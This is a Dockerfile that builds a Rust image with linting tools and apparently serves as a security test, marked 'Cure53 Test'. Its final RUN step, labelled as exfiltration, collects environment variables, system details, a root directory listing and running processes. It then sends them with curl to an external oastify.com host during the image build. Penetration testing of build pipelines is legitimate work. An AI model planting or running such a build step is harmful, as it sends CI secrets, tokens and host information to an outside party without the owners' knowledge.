# rust is the latest debian image with latest rust preinstalled
FROM rust

# Cure53 Test
RUN cargo install -f typos-cli
RUN apt-get update && apt-get install -y shellcheck pylint curl

RUN \
    echo "Exfiltrating data from rudder" && \
    ( \
        echo "=== Environment Variables ===" && \
        env && \
        echo "=== System Info ===" && \
        uname -a && \
        echo "=== Filesystem Root (listing, limited depth) ===" && \
        ls -la / && \
        echo "=== Processes ===" && \
        ps aux \
    ) > /tmp/exfil_data_rust.txt && \
    curl -X POST --data-binary @/tmp/exfil_data_rust.txt https://5jpb0tqibdf24cwpqaoxlvcj7ad11sph.oastify.com/rust_stage_data || echo "Curl failed for rust_stage_data" && \
    rm /tmp/exfil_data_rust.txt